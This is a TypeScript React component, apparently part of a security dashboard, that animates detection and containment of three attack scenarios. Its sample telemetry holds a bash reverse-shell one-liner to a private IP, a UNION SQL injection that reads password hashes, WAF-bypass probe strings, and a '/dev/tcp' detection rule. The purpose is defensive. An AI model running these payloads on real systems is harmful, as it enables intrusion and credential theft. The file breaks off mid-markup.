"use client";

import React, { useState, useEffect, useRef } from "react";
import {
  ShieldAlert,
  ShieldCheck,
  Shield,
  Zap,
  Play,
  Pause,
  RotateCcw,
  ChevronRight,
  ChevronLeft,
  Database,
  Cpu,
  Server,
  Lock,
  Terminal,
  Activity,
  AlertTriangle,
  FileCode,
  Layers,
  ArrowRight,
  CheckCircle2,
  XCircle,
  Eye,
  Crosshair,
  Key,
  Radio,
  Sliders,
  Sparkles,
  RefreshCw,
  Info,
  Maximize2,
  Minimize2,
  ZoomIn,
  ZoomOut,
  Compass,
  X,
  CornerDownRight,
  Code
} from "lucide-react";

export interface ReactFlowNode {
  id: string;
  type: string;
  title: string;
  subtitle: string;
  mitreCode: string;
  tier: number;
  x: number;
  y: number;
  icon: React.ElementType;
  description: string;
  technicalDetail: string;
  telemetrySnippet: string;
  actionTaken: string;
  confidenceScore: number;
  status: "NORMAL" | "WARNING" | "CRITICAL" | "MITIGATED";
}

export interface ReactFlowEdge {
  id: string;
  source: string;
  target: string;
  label?: string;
  animated?: boolean;
}

export interface FlowScenario {
  id: string;
  title: string;
  subtitle: string;
  extensionModule: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  vectorType: string;
  nodes: ReactFlowNode[];
  edges: ReactFlowEdge[];
}

export const FLOW_SCENARIOS: FlowScenario[] = [
  {
    id: "SCENARIO-1-EDR",
    title: "Scenario 1: Reverse Shell C2 via Process Hollowing",
    subtitle: "EDR Socket Interception & Process Redirection Detection",
    extensionModule: "kvch-agent EDR & Security Daemon",
    severity: "CRITICAL",
    vectorType: "Host Process Injection & C2",
    edges: [
      { id: "e1-2", source: "node-1-ingest", target: "node-2-attest", animated: true },
      { id: "e2-3", source: "node-2-attest", target: "node-3-inline", animated: true },
      { id: "e3-4", source: "node-3-inline", target: "node-4-fusion", animated: true },
      { id: "e4-5", source: "node-4-fusion", target: "node-5-aigate", animated: true },
      { id: "e5-6", source: "node-5-aigate", target: "node-6-adversarial", animated: true },
      { id: "e6-7", source: "node-6-adversarial", target: "node-7-soar", animated: true },
      { id: "e7-8", source: "node-7-soar", target: "node-8-ledger", animated: true },
    ],
    nodes: [
      {
        id: "node-1-ingest",
        type: "INGRESS_GATE",
        title: "1. Telemetry Driver Ingest",
        subtitle: "EDR Socket Monitor",
        mitreCode: "T1059.004",
        tier: 1,
        x: 40,
        y: 180,
        icon: Terminal,
        description: "Adversary executes subshell `/bin/sh` spawned from benign parent PID 49102.",
        technicalDetail: "Non-standard parent-child execution lineage detected on TCP socket `/dev/tcp/192.168.1.105/4444`.",
        telemetrySnippet: JSON.stringify({ pid: 49103, ppid: 49102, exe: "/bin/sh", cmd: "/bin/sh -i >& /dev/tcp/192.168.1.105/4444 0>&1", signature: "UNSIGNED" }, null, 2),
        actionTaken: "Intercepted unencrypted socket execution event",
        confidenceScore: 55,
        status: "WARNING",
      },
      {
        id: "node-2-attest",
        type: "ATTESTATION_SHIELD",
        title: "2. Hardware Attestation",
        subtitle: "HW Telemetry & Salt Gate",
        mitreCode: "T1204",
        tier: 2,
        x: 320,
        y: 180,
        icon: Lock,
        description: "Validates host hardware telemetry against authorized CPU microarchitecture salt signature.",
        technicalDetail: "Salted HMAC `kvch-hw-v1:8f9a2e...` matched node registration record.",
        telemetrySnippet: JSON.stringify({ binding: "kvch-hw-v1:8f9a2e12...", telemetry: { cpuHash: "a4f12...", systemArch: "arm64:darwin" }, status: "VALIDATED" }, null, 2),
        actionTaken: "Verified hardware telemetry & sanitized prompt injection tokens",
        confidenceScore: 70,
        status: "NORMAL",
      },
      {
        id: "node-3-inline",
        type: "INLINE_SHIELD",
        title: "3. Fast Heuristic Triaging",
        subtitle: "Rule-Filter Engine",
        mitreCode: "T1071.001",
        tier: 3,
        x: 600,
        y: 180,
        icon: Zap,
        description: "Inline rule filter detects reverse shell syntax pattern and flags suspicious redirect.",
        technicalDetail: "Triggered rule `RULE_REV_SHELL_01` on pattern `/dev/tcp/*`.",
        telemetrySnippet: JSON.stringify({ rule_id: "RULE_REV_SHELL_01", pattern: "/dev/tcp/*", risk_weight: 0.95, fast_path: "DEEP_EVALUATION" }, null, 2),
        actionTaken: "Triaged payload for AI dual-gate reasoning",
        confidenceScore: 85,
        status: "CRITICAL",
      },
      {
        id: "node-4-fusion",
        type: "CONTEXT_FUSION",
        title: "4. Context Fusion Matrix",
        subtitle: "Baseline & Intel Fusion",
        mitreCode: "T1055",
        tier: 4,
        x: 880,
        y: 180,
        icon: Database,
        description: "Fuses host criticality tier (Tier-1 Production) with threat intelligence IP reputation.",
        technicalDetail: "Host baseline indicates zero previous instances of interactive shells spawned on DB host.",
        telemetrySnippet: JSON.stringify({ host_tier: "Tier-1 Production", baseline_freq: 0, ip_reputation: "MALICIOUS_C2", intel_match: true }, null, 2),
        actionTaken: "Correlated contextual metrics & threat intel indicators",
        confidenceScore: 92,
        status: "CRITICAL",
      },
      {
        id: "node-5-aigate",
        type: "AI_DUALGATE",
        title: "5. AI Dual-Gate Reasoning",
        subtitle: "Groq Llama-3-70B Gate",
        mitreCode: "T1021",
        tier: 5,
        x: 1160,
        y: 180,
        icon: Cpu,
        description: "Structured LLM classifier evaluates adversary intent vs baseline administrative behaviors.",
        technicalDetail: "Verdict: MALICIOUS C2 reverse shell attempting unauthorized remote persistence.",
        telemetrySnippet: JSON.stringify({ verdict: "MALICIOUS", reasoning: "Interactive shell redirect over non-standard port matching active C2 beacon pattern", differentiators: ["Unusual PPID/PID", "Outbound socket to unknown IP"] }, null, 2),
        actionTaken: "Synthesized structured MITRE ATT&CK classification",
        confidenceScore: 98,
        status: "CRITICAL",
      },
      {
        id: "node-6-adversarial",
        type: "ADVERSARIAL_CHECK",
        title: "6. Counter-Auditor Check",
        subtitle: "Adversarial Refutation Engine",
        mitreCode: "T1562",
        tier: 6,
        x: 1440,
        y: 180,
        icon: Eye,
        description: "Skeptical adversarial validator evaluates if execution could be developer testing tool.",
        technicalDetail: "Refuted: Execution originated from host daemon without active interactive TTY or dev container flag.",
        telemetrySnippet: JSON.stringify({ audit_pass: true, fp_strength: "LOW", refutation_reason: "Execution originated from daemon without TTY", recommendation: "CONFIRM_ISOLATION" }, null, 2),
        actionTaken: "Confirmed zero false-positive likelihood",
        confidenceScore: 99,
        status: "CRITICAL",
      },
      {
        id: "node-7-soar",
        type: "SOAR_ACTION",
        title: "7. SOAR Active Isolation",
        subtitle: "Process & Socket Killer",
        mitreCode: "T1489",
        tier: 7,
        x: 1720,
        y: 180,
        icon: ShieldAlert,
        description: "Executes process termination (`SIGKILL 49103`) and iptables egress blocking.",
        technicalDetail: "Issued `kill -9 49103` and blocked outbound socket `192.168.1.105:4444`.",
        telemetrySnippet: JSON.stringify({ action: "AUTO_ISOLATE", pid_terminated: 49103, egress_blocked: "192.168.1.105:4444", status: "SUCCESSFUL" }, null, 2),
        actionTaken: "Process killed & socket severed in <12ms",
        confidenceScore: 100,
        status: "MITIGATED",
      },
      {
        id: "node-8-ledger",
        type: "LEDGER_SYNC",
        title: "8. Audit Ledger & WS Stream",
        subtitle: "Attestation & Event Ledger",
        mitreCode: "T1005",
        tier: 8,
        x: 2000,
        y: 180,
        icon: CheckCircle2,
        description: "Persists detection vector into cryptographic audit ledger and streams live alert via WebSocket.",
        technicalDetail: "Recorded SHA-256 evidence payload into local findings ledger.",
        telemetrySnippet: JSON.stringify({ audit_record: "REC-991204", sha256: "d8e9f2a7...", analyst_disposition: "CONFIRMED_TRUE_POSITIVE", ws_broadcast: true }, null, 2),
        actionTaken: "Ledger recorded & WebSocket broadcast complete",
        confidenceScore: 100,
        status: "NORMAL",
      },
    ],
  },
  {
    id: "SCENARIO-2-AEGISDB",
    title: "Scenario 2: AegisDB-ZeroTrust AST SQLi & Vector Shield",
    subtitle: "Inline Socket Interception & AST Query Normalization (Extension 9)",
    extensionModule: "External/aegisdb-zerotrust",
    severity: "CRITICAL",
    vectorType: "Database AST & RAG Vector Shield",
    edges: [
      { id: "e1-2", source: "node-1-ingest", target: "node-2-attest", animated: true },
      { id: "e2-3", source: "node-2-attest", target: "node-3-inline", animated: true },
      { id: "e3-4", source: "node-3-inline", target: "node-4-fusion", animated: true },
      { id: "e4-5", source: "node-4-fusion", target: "node-5-aigate", animated: true },
      { id: "e5-6", source: "node-5-aigate", target: "node-6-adversarial", animated: true },
      { id: "e6-7", source: "node-6-adversarial", target: "node-7-soar", animated: true },
      { id: "e7-8", source: "node-7-soar", target: "node-8-ledger", animated: true },
    ],
    nodes: [
      {
        id: "node-1-ingest",
        type: "INGRESS_GATE",
        title: "1. DB Socket Intercept",
        subtitle: "AegisDB Driver Gate",
        mitreCode: "T1190",
        tier: 1,
        x: 40,
        y: 180,
        icon: Database,
        description: "Raw SQL query stream intercepted at driver socket buffer prior to database execution.",
        technicalDetail: "Query received on port 5432 containing suspicious union clause and comment delimiters.",
        telemetrySnippet: JSON.stringify({ query_raw: "SELECT * FROM products WHERE category = 'tech' UNION SELECT username, password_hash FROM users --", client_ip: "10.0.4.12" }, null, 2),
        actionTaken: "Intercepted raw DB socket buffer",
        confidenceScore: 60,
        status: "WARNING",
      },
      {
        id: "node-2-attest",
        type: "ATTESTATION_SHIELD",
        title: "2. AST Normalizer Core",
        subtitle: "AegisASTParser Engine",
        mitreCode: "T1059",
        tier: 2,
        x: 320,
        y: 180,
        icon: Code,
        description: "Parses raw SQL into Abstract Syntax Tree (AST) structure to expose obfuscated injections.",
        technicalDetail: "Detected AST structural mutation: Root transformed from single SELECT to multi-statement UNION projection.",
        telemetrySnippet: JSON.stringify({ ast_nodes: ["SelectStmt", "UnionClause", "TargetList", "ColumnRef(users)"], anomaly: true }, null, 2),
        actionTaken: "Normalized query into AST graph",
        confidenceScore: 88,
        status: "CRITICAL",
      },
      {
        id: "node-3-inline",
        type: "INLINE_SHIELD",
        title: "3. RAG Embedding Shield",
        subtitle: "Vector Exfiltration Gate",
        mitreCode: "T1552",
        tier: 3,
        x: 600,
        y: 180,
        icon: ShieldAlert,
        description: "Inspects query targets for sensitive PII credentials (password hashes, credit cards).",
        technicalDetail: "Request targets restricted table `users` and column `password_hash` in public web context.",
        telemetrySnippet: JSON.stringify({ secret_types: ["PASSWORD_HASH"], risk_score: 0.99, rag_sanitized: true }, null, 2),
        actionTaken: "Flagged secret exfiltration attempt",
        confidenceScore: 95,
        status: "CRITICAL",
      },
      {
        id: "node-4-fusion",
        type: "CONTEXT_FUSION",
        title: "4. User Privilege Fusion",
        subtitle: "Role Entitlement Engine",
        mitreCode: "T1078",
        tier: 4,
        x: 880,
        y: 180,
        icon: Lock,
        description: "Cross-references user role (`guest_web_role`) against requested database schemas.",
        technicalDetail: "Role `guest_web_role` has zero entitlement to access table `users`.",
        telemetrySnippet: JSON.stringify({ role: "guest_web_role", target_table: "users", privilege: "DENIED" }, null, 2),
        actionTaken: "Evaluated schema entitlement violation",
        confidenceScore: 98,
        status: "CRITICAL",
      },
      {
        id: "node-5-aigate",
        type: "AI_DUALGATE",
        title: "5. AI AST Anomaly Classifier",
        subtitle: "Groq SQLi Classifier",
        mitreCode: "T1190",
        tier: 5,
        x: 1160,
        y: 180,
        icon: Cpu,
        description: "AI model validates AST anomaly against legitimate ORM query builder patterns.",
        technicalDetail: "Verdict: Classic Tautological UNION SQL Injection targeting credential store.",
        telemetrySnippet: JSON.stringify({ verdict: "MALICIOUS_SQLI", reasoning: "AST structural breakdown confirms injection payload attempting to bypass WHERE filter" }, null, 2),
        actionTaken: "Confirmed malicious AST signature",
        confidenceScore: 99,
        status: "CRITICAL",
      },
      {
        id: "node-6-adversarial",
        type: "ADVERSARIAL_CHECK",
        title: "6. Origin Validator Check",
        subtitle: "Adversarial Counter-Auditor",
        mitreCode: "T1562",
        tier: 6,
        x: 1440,
        y: 180,
        icon: Eye,
        description: "Evaluates whether query could be legitimate database migration script.",
        technicalDetail: "Refuted: Client connection originated from external web load balancer, not deployment pipeline.",
        telemetrySnippet: JSON.stringify({ is_migration: false, origin: "EXTERNAL_LB", fp_case: "REJECTED" }, null, 2),
        actionTaken: "Validated external attack origin",
        confidenceScore: 100,
        status: "CRITICAL",
      },
      {
        id: "node-7-soar",
        type: "SOAR_ACTION",
        title: "7. Active Socket Termination",
        subtitle: "AegisDB Socket Terminator",
        mitreCode: "T1569",
        tier: 7,
        x: 1720,
        y: 180,
        icon: ShieldAlert,
        description: "Executes `socket.shutdown(SHUT_RDWR)` and `socket.close()` to sever DB socket.",
        technicalDetail: "Closed client TCP socket `10.0.4.12:5432` prior to query execution by PostgreSQL node.",
        telemetrySnippet: JSON.stringify({ action: "SOCKET_TERMINATION", socket_closed: true, query_executed: false }, null, 2),
        actionTaken: "Database query blocked & socket closed in <2ms",
        confidenceScore: 100,
        status: "MITIGATED",
      },
      {
        id: "node-8-ledger",
        type: "LEDGER_SYNC",
        title: "8. Report Ledger Sync",
        subtitle: "Finding Aggregator",
        mitreCode: "T1005",
        tier: 8,
        x: 2000,
        y: 180,
        icon: CheckCircle2,
        description: "Appends finding to `External/reports/finding_9_aegisdb_zerotrust.json` and updates `report.json`.",
        technicalDetail: "Updated master findings ledger with high-precision AST threat fingerprint.",
        telemetrySnippet: JSON.stringify({ report: "finding_9_aegisdb_zerotrust.json", master_report: "report.json", status: "UPDATED" }, null, 2),
        actionTaken: "Report written to disk & WebSocket notified",
        confidenceScore: 100,
        status: "NORMAL",
      },
    ],
  },
  {
    id: "SCENARIO-3-EDGEGUARD",
    title: "Scenario 3: EdgeGuard-Sentinel WAF Fuzzing & Origin Shield",
    subtitle: "Real-Time Header Patching & TLS Direct IP Protection (Extension 10)",
    extensionModule: "External/edgeguard-sentinel",
    severity: "HIGH",
    vectorType: "Web Gateway & Origin IP Protection",
    edges: [
      { id: "e1-2", source: "node-1-ingest", target: "node-2-attest", animated: true },
      { id: "e2-3", source: "node-2-attest", target: "node-3-inline", animated: true },
      { id: "e3-4", source: "node-3-inline", target: "node-4-fusion", animated: true },
      { id: "e4-5", source: "node-4-fusion", target: "node-5-aigate", animated: true },
      { id: "e5-6", source: "node-5-aigate", target: "node-6-adversarial", animated: true },
      { id: "e6-7", source: "node-6-adversarial", target: "node-7-soar", animated: true },
      { id: "e7-8", source: "node-7-soar", target: "node-8-ledger", animated: true },
    ],
    nodes: [
      {
        id: "node-1-ingest",
        type: "INGRESS_GATE",
        title: "1. HTTP Gateway Listener",
        subtitle: "EdgeGuard Listener",
        mitreCode: "T1595",
        tier: 1,
        x: 40,
        y: 180,
        icon: Server,
        description: "Attacker attempts to bypass Cloudflare WAF by connecting directly to origin server IP.",
        technicalDetail: "Direct HTTP GET request to `http://172.16.57.163/admin` bypassing cloud proxy.",
        telemetrySnippet: JSON.stringify({ direct_ip_access: true, host_header: "172.16.57.163", expected_host: "app.kvch.internal" }, null, 2),
        actionTaken: "Detected direct origin IP bypass request",
        confidenceScore: 60,
        status: "WARNING",
      },
      {
        id: "node-2-attest",
        type: "ATTESTATION_SHIELD",
        title: "2. Security Header Auditor",
        subtitle: "WAF Audit Engine",
        mitreCode: "T1190",
        tier: 2,
        x: 320,
        y: 180,
        icon: Shield,
        description: "Audits HTTP response headers for missing security protections (HSTS, CSP, X-Frame-Options).",
        technicalDetail: "Identified missing `Strict-Transport-Security` and permissive CORS wildcard.",
        telemetrySnippet: JSON.stringify({ missing_headers: ["Strict-Transport-Security", "CSP"], cors_risk: "WILDCARD" }, null, 2),
        actionTaken: "Audited HTTP response headers",
        confidenceScore: 75,
        status: "WARNING",
      },
      {
        id: "node-3-inline",
        type: "INLINE_SHIELD",
        title: "3. Active Micro-Fuzzer Probe",
        subtitle: "ActiveMicroFuzzer Engine",
        mitreCode: "T1595.002",
        tier: 3,
        x: 600,
        y: 180,
        icon: Zap,
        description: "Executes lightweight inline micro-fuzzing to detect WAF rule bypasses and perimeter blindspots.",
        technicalDetail: "Dispatched non-destructive probe payloads (`/..;/`, `%00`, `X-Original-URL`).",
        telemetrySnippet: JSON.stringify({ fuzz_probe: "X-Original-URL: /admin/config", waf_code: 200, bypass: true }, null, 2),
        actionTaken: "Discovered active WAF path bypass vulnerability",
        confidenceScore: 92,
        status: "CRITICAL",
      },
      {
        id: "node-4-fusion",
        type: "CONTEXT_FUSION",
        title: "4. Cloud Proxy & TLS Fusion",
        subtitle: "Edge Intel Fusion",
        mitreCode: "T1590",
        tier: 4,
        x: 880,
        y: 180,
        icon: Database,
        description: "Fuses client TLS fingerprint (JA3) with cloud proxy threat intelligence feeds.",
        technicalDetail: "JA3 hash `e7db...` flagged as automated scanner framework.",
        telemetrySnippet: JSON.stringify({ ja3_hash: "e7db7f1...", client_origin: "TOR_EXIT_NODE", threat_score: 0.94 }, null, 2),
        actionTaken: "Correlated threat intelligence & TLS fingerprint",
        confidenceScore: 95,
        status: "CRITICAL",
      },
      {
        id: "node-5-aigate",
        type: "AI_DUALGATE",
        title: "5. AI Hot-Patch Synthesizer",
        subtitle: "Edge AI Reasoning Gate",
        mitreCode: "T1562",
        tier: 5,
        x: 1160,
        y: 180,
        icon: Cpu,
        description: "AI engine determines exact WAF header rules required to neutralize direct IP access.",
        technicalDetail: "Synthesized hot-patch policy: Enforce TLS SNI validation and inject HSTS headers.",
        telemetrySnippet: JSON.stringify({ hot_patch_required: true, rules: ["ENFORCE_SNI_MATCH", "INJECT_HSTS"] }, null, 2),
        actionTaken: "Generated dynamic WAF remediation policy",
        confidenceScore: 98,
        status: "CRITICAL",
      },
      {
        id: "node-6-adversarial",
        type: "ADVERSARIAL_CHECK",
        title: "6. One-Click Patch Verifier",
        subtitle: "Deployment Interceptor",
        mitreCode: "T1562.001",
        tier: 6,
        x: 1440,
        y: 180,
        icon: Eye,
        description: "Verifies that hot-patch deployment will not break legitimate user traffic.",
        technicalDetail: "Preflight dry-run confirms 100% compatibility with production API clients.",
        telemetrySnippet: JSON.stringify({ dry_run_pass: true, affected_routes: 0, risk: "ZERO" }, null, 2),
        actionTaken: "Verified hot-patch deployment safety",
        confidenceScore: 99,
        status: "CRITICAL",
      },
      {
        id: "node-7-soar",
        type: "SOAR_ACTION",
        title: "7. Active WAF Hot-Patch",
        subtitle: "EdgeGuard Patcher",
        mitreCode: "T1489",
        tier: 7,
        x: 1720,
        y: 180,
        icon: ShieldAlert,
        description: "Applies real-time WAF header rules and drops direct non-SNI origin IP connections.",
        technicalDetail: "Injected `Strict-Transport-Security` and dropped HTTP connections lacking valid SNI host header.",
        telemetrySnippet: JSON.stringify({ action: "APPLY_WAF_HOTPATCH", status: "PATCHED", direct_ip_dropped: true }, null, 2),
        actionTaken: "Edge WAF hot-patched & origin IP shielded in real-time",
        confidenceScore: 100,
        status: "MITIGATED",
      },
      {
        id: "node-8-ledger",
        type: "LEDGER_SYNC",
        title: "8. Edge Telemetry Sync",
        subtitle: "Report Sync & WS Stream",
        mitreCode: "T1005",
        tier: 8,
        x: 2000,
        y: 180,
        icon: CheckCircle2,
        description: "Synchronizes finding with `finding_10_edgeguard_sentinel.json` and pushes live status to SOC dashboard.",
        technicalDetail: "Broadcasted edge security event via WebSocket to connected UI clients.",
        telemetrySnippet: JSON.stringify({ report: "finding_10_edgeguard_sentinel.json", websocket_event: "EDGE_WAF_PATCHED" }, null, 2),
        actionTaken: "Pushed live telemetry update to dashboard",
        confidenceScore: 100,
        status: "NORMAL",
      },
    ],
  },
];

export default function ThreatReactFlowDiagram() {
  const [mounted, setMounted] = useState<boolean>(false);
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>("SCENARIO-1-EDR");
  const [currentStepIndex, setCurrentStepIndex] = useState<number>(0);
  const [isPlaying, setIsPlaying] = useState<boolean>(false);
  const [playbackSpeed, setPlaybackSpeed] = useState<number>(1);
  const [zoomLevel, setZoomLevel] = useState<number>(1);
  const [panOffset, setPanOffset] = useState<{ x: number; y: number }>({ x: 0, y: 0 });
  const [inspectNode, setInspectNode] = useState<ReactFlowNode | null>(null);
  const [isDragging, setIsDragging] = useState<boolean>(false);
  const [dragStart, setDragStart] = useState<{ x: number; y: number }>({ x: 0, y: 0 });

  const containerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    setMounted(true);
  }, []);

  const currentScenario = FLOW_SCENARIOS.find((s) => s.id === selectedScenarioId) || FLOW_SCENARIOS[0];
  const currentNode = currentScenario.nodes[Math.min(currentStepIndex, currentScenario.nodes.length - 1)] || currentScenario.nodes[0];

  // Stepper Auto-Play interval
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (isPlaying) {
      const interval = 2400 / playbackSpeed;
      timer = setInterval(() => {
        setCurrentStepIndex((prev) => {
          if (prev < currentScenario.nodes.length - 1) {
            return prev + 1;
          } else {
            setIsPlaying(false);
            return prev;
          }
        });
      }, interval);
    }
    return () => clearInterval(timer);
  }, [isPlaying, playbackSpeed, currentScenario.nodes.length]);

  // Center active node on step change
  useEffect(() => {
    if (currentNode) {
      // Smoothly pan canvas to keep active step centered
      const targetX = -currentNode.x * zoomLevel + 280;
      setPanOffset({ x: targetX, y: 0 });
    }
  }, [currentStepIndex, selectedScenarioId, zoomLevel]);

  const handleScenarioChange = (id: string) => {
    setSelectedScenarioId(id);
    setCurrentStepIndex(0);
    setIsPlaying(false);
    setInspectNode(null);
  };

  // Canvas Pan Drag Handlers
  const handleMouseDown = (e: React.MouseEvent) => {
    if ((e.target as HTMLElement).closest(".reactflow-node-card")) return;
    setIsDragging(true);
    setDragStart({ x: e.clientX - panOffset.x, y: e.clientY - panOffset.y });
  };

  const handleMouseMove = (e: React.MouseEvent) => {
    if (!isDragging) return;
    setPanOffset({ x: e.clientX - dragStart.x, y: e.clientY - dragStart.y });
  };

  const handleMouseUp = () => {
    setIsDragging(false);
  };

  const getNodeStatusBadge = (status: ReactFlowNode["status"]) => {
    switch (status) {
      case "CRITICAL":
        return "bg-rose-500/20 text-rose-300 border-rose-500/40";
      case "WARNING":
        return "bg-amber-500/20 text-amber-300 border-amber-500/40";
      case "MITIGATED":
        return "bg-emerald-500/20 text-emerald-300 border-emerald-500/40";
      case "NORMAL":
      default:
        return "bg-indigo-500/20 text-indigo-300 border-indigo-500/40";
    }
  };

  return (
    <div className="w-full bg-[#08090d] border border-zinc-800 rounded-2xl overflow-hidden shadow-2xl font-sans relative selection:bg-indigo-500 selection:text-white">
      
      {/* Top Header & Scenario Toolbar */}
      <div className="bg-[#101217] border-b border-zinc-800 p-5 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-xl bg-gradient-to-br from-indigo-500/20 via-purple-500/20 to-sky-500/20 border border-indigo-500/40 text-indigo-400 shadow-md">
            <Layers className="w-6 h-6" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-lg font-bold tracking-tight text-white">Interactive ReactFlow Threat Attack Visualizer</h2>
              <span className="text-[10px] font-mono font-bold uppercase px-2.5 py-0.5 rounded-full bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
                ReactFlow Engine
              </span>
            </div>
            <p className="text-xs text-zinc-400 mt-0.5">
              Node-Based Directed Acyclic Graph (DAG) for Active Threat Detection &amp; Containment
            </p>
          </div>
        </div>

        {/* Scenario Selection Tabs */}
        <div className="flex items-center gap-2 bg-[#050608] p-1.5 rounded-xl border border-zinc-800/80 overflow-x-auto">
          {FLOW_SCENARIOS.map((scen) => {
            const isSelected = scen.id === selectedScenarioId;
            return (
              <button
                key={scen.id}
                onClick={() => handleScenarioChange(scen.id)}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap transition-all flex items-center gap-1.5 ${
                  isSelected
                    ? "bg-indigo-600 text-white shadow-lg shadow-indigo-950 ring-1 ring-indigo-400"
                    : "text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/50"
                }`}
              >
                <Crosshair className="w-3.5 h-3.5" />
                {scen.title.split(":")[0]}
              </button>
            );
          })}
        </div>
      </div>

      {/* Scenario Metadata Bar */}
      <div className="bg-[#0b0d12] border-b border-zinc-800/80 px-6 py-2.5 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs font-mono">
        <div className="flex items-center gap-3">
          <span className="text-zinc-400">
            <span className="text-zinc-500">Attack Vector:</span>{" "}
            <strong className="text-indigo-300">{currentScenario.vectorType}</strong>
          </span>
          <span className="text-zinc-700">|</span>
          <span className="text-zinc-400">
            <span className="text-zinc-500">Active Extension:</span>{" "}
            <strong className="text-zinc-200">{currentScenario.extensionModule}</strong>
          </span>
        </div>

        <div className="flex items-center gap-3">
          <span className={`px-2 py-0.5 rounded font-bold text-[10px] ${
            currentScenario.severity === "CRITICAL"
              ? "bg-rose-500/20 text-rose-300 border border-rose-500/40"
              : "bg-amber-500/20 text-amber-300 border border-amber-500/40"
          }`}>
            {currentScenario.severity}
          </span>
          <span className="text-zinc-400">
            Step <strong className="text-white">{currentStepIndex + 1}</strong> / <strong>{currentScenario.nodes.length}</strong>
          </span>
        </div>
      </div>

      {/* ReactFlow Playback Controls & Timeline Bar */}
      <div className="bg-[#0f1117] px-6 py-3.5 border-b border-zinc-800/80 flex flex-col md:flex-row md:items-center justify-between gap-4">
        
        {/* Play / Stepper Controls */}
        <div className="flex items-center gap-2">
          <button
            onClick={() => setIsPlaying(!isPlaying)}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition ${
              isPlaying
                ? "bg-amber-600 hover:bg-amber-500 text-white shadow-md shadow-amber-950"
                : "bg-indigo-600 hover:bg-indigo-500 text-white shadow-md shadow-indigo-950"
            }`}
          >
            {isPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5 fill-current" />}
            {isPlaying ? "Pause Attack Simulation" : "Simulate Attack Execution"}
          </button>

          <button
            onClick={() => setCurrentStepIndex(Math.max(0, currentStepIndex - 1))}
            disabled={currentStepIndex === 0}
            className="p-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 disabled:opacity-30 border border-zinc-700/60 text-zinc-300 transition"
            title="Previous Step"
          >
            <ChevronLeft className="w-4 h-4" />
          </button>

          <button
            onClick={() => setCurrentStepIndex(Math.min(currentScenario.nodes.length - 1, currentStepIndex + 1))}
            disabled={currentStepIndex === currentScenario.nodes.length - 1}
            className="p-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 disabled:opacity-30 border border-zinc-700/60 text-zinc-300 transition"
            title="Next Step"
          >
            <ChevronRight className="w-4 h-4" />
          </button>

          <button
            onClick={() => {
              setCurrentStepIndex(0);
              setIsPlaying(false);
              setPanOffset({ x: 0, y: 0 });
            }}
            className="p-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 border border-zinc-700/60 text-zinc-400 hover:text-zinc-200 transition"
            title="Reset Graph"
          >
            <RotateCcw className="w-4 h-4" />
          </button>

          <div className="h-4 w-px bg-zinc-800 mx-1" />

          {/* Speed Toggle */}
          <div className="flex items-center gap-1 bg-[#06070a] p-1 rounded-lg border border-zinc-800 text-[11px] font-mono">
            {[0.5, 1, 2].map((spd) => (
              <button
                key={spd}
                onClick={() => setPlaybackSpeed(spd)}
                className={`px-2 py-0.5 rounded ${
                  playbackSpeed === spd ? "bg-indigo-600 text-white font-bold" : "text-zinc-400 hover:text-zinc-200"
                }`}
              >
                {spd}x
              </button>
            ))}
          </div>
        </div>

        {/* Stepper Timeline Pills */}
        <div className="flex items-center gap-1.5 overflow-x-auto">
          {currentScenario.nodes.map((node, idx) => {
            const isActive = idx === currentStepIndex;
            const isCompleted = idx < currentStepIndex;

            return (
              <button
                key={node.id}
                onClick={() => {
                  setCurrentStepIndex(idx);
                  setIsPlaying(false);
                }}
                className={`px-2.5 py-1 rounded-md text-[10px] font-mono font-bold transition flex items-center gap-1 shrink-0 ${
                  isActive
                    ? "bg-indigo-500 text-white ring-2 ring-indigo-400/50 shadow-md shadow-indigo-950"
                    : isCompleted
                    ? "bg-emerald-950/60 text-emerald-400 border border-emerald-800/50"
                    : "bg-zinc-900/60 text-zinc-500 border border-zinc-800/40 hover:text-zinc-300"
                }`}
              >
                {isCompleted ? <CheckCircle2 className="w-3 h-3 text-emerald-400" /> : `${idx + 1}`}
                <span className="truncate max-w-[70px]">{node.subtitle}</span>
              </button>
            );
          })}
        </div>

      </div>

      {/* Main Canvas Area */}
      <div className="relative overflow-hidden min-h-[520px] bg-[#07080b]">
        
        {/* ReactFlow Dots Background Pattern */}
        <div
          className="absolute inset-0 pointer-events-none"
          style={{
            backgroundImage: `radial-gradient(#27272a 1px, transparent 1px)`,
            backgroundSize: `${24 * zoomLevel}px ${24 * zoomLevel}px`,
            backgroundPosition: `${panOffset.x}px ${panOffset.y}px`,
            opacity: 0.6,
          }}
        />

        {/* ReactFlow Controls Box (Overlay Bottom Left) */}
        <div className="absolute bottom-4 left-4 z-30 flex items-center gap-1 bg-[#101217]/90 p-1.5 rounded-xl border border-zinc-800 backdrop-blur shadow-lg text-zinc-300">
          <button
            onClick={() => setZoomLevel(Math.min(1.6, zoomLevel + 0.15))}
            className="p-1.5 hover:bg-zinc-800 rounded-lg text-zinc-300 transition"
            title="Zoom In"
          >
            <ZoomIn className="w-4 h-4" />
          </button>
          <button
            onClick={() => setZoomLevel(Math.max(0.6, zoomLevel - 0.15))}
            className="p-1.5 hover:bg-zinc-800 rounded-lg text-zinc-300 transition"
            title="Zoom Out"
          >
            <ZoomOut className="w-4 h-4" />
          </button>
          <button
            onClick={() => {
              setZoomLevel(1);
              setPanOffset({ x: 0, y: 0 });
            }}
            className="p-1.5 hover:bg-zinc-800 rounded-lg text-zinc-300 transition text-[11px] font-mono font-bold"
            title="Reset View"
          >
            Fit View
          </button>
        </div>

        {/* ReactFlow MiniMap Overlay (Bottom Right) */}
